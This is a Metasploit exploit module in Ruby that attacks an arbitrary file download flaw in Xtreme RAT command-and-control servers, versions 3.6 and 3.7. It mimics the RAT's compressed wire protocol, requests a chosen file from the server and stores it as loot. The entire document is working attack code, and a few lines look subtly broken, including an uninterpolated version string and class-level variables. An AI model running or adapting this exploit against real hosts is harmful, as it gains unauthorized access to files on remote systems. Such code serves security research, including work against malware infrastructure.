##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zlib'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xtreme Rat Controller Remote File Download Exploit',
      'Description'    => %q{
          This module exploits an arbitrary file download vulnerability in the Xtreme C&C server
      },
      'Author'         => 'Professor Plum',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
        ],
      'Platform'       => 'win',
      'DisclosureDate' => 'Jul 27 2017',
      'Targets'        =>
        [
          ['Xtreme RAT 3.6', { 'Ver' => '3.6' }],
          ['Xtreme RAT 3.7', { 'Ver' => '3.7' }]
        ],
      'Privileged'     => false,
      'DefaultTarget' => 1))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETFILE', [false, 'Target file to download', 'user.info'])
      ], self.class
    )
  end

  @delm = "\xc2\x00\xaa\x00\xc2\x00\xaa\x00\xc2\x00\xaa\x00#\x00#\x00#\x00\xe2\x00\" a\x01\xe2\x00\" a\x01\xe2\x00\" a\x01".force_encoding('utf-16le')
  @password = ''
  @conid = ''

  def validate(b)
    if b != "X\r\n"
      print_status(b.inspect)
      return false
    end
    true
  end

  def check
    connect
    sock.put("myversion|#{target['Ver']}\r\n")
    if validate(sock.recv(3))
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end

  def make_string(cmd, msg)
    pp = (cmd + @delm + msg)
    pack = Zlib::Deflate.deflate(pp)
    return @password + [pack.size, 0].pack('<II') + pack
  end

  def read_string(sock)
    d = sock.recv(16)
    if d.size < 16
      print_status("Didn't receive full packet!")
      return
    end
    @password = d[0..7]
    size = d[8..12].unpack('<I')[0]
    d = ''
    while d.size < size
      d += sock.get_once(size - d.size)
    end
    if d.size != size
      print_status("Bad response! #{d.size} != #{size}")
      return
    end
    msg = Zlib::Inflate.inflate(d).force_encoding('utf-16le')
    cmd, data = msg.split(@delm)
    # print_status("#{cmd.inspect} | #{data.inspect}")
    if 'maininfo'.encode('utf-16le') == cmd
      @conid = data
    end
    if 'updateserverlocal'.encode('utf-16le') == cmd
      fsize = data.encode('binary').to_i
      fdata = ''
      while fdata.size < fsize
        fdata += sock.get_once(fsize - fdata.size)
      end
      print_status("Received file #{datastore['TARGETFILE']}!")
      # print_status(fdata.inspect)
      store_loot('xtremeRat.file', 'text/plain', datastore['RHOST'], fdata, datastore['TARGETFILE'], 'File retrieved from Xtreme C2 server')
    end
  end

  def exploit
    print_status("Trying target #{target.name}...")

    connect
    sock.put("myversion|{target['Ver']}\r\n")
    unless validate(sock.get_once(3))
      print_status('Server did not Ack hello')
      return
    end
    read_string(sock)

    print_status('Sending request')
    sock.put(make_string('newconnection|'.encode('utf-16le') + @conid + @delm + 'updateserverlocal'.encode('utf-16le'), datastore['TARGETFILE'].encode('utf-16le')))
    unless validate(sock.get_once(3))
      print_status('Server did not Ack message')
      return
    end
    read_string(sock)
    disconnect
  end
end
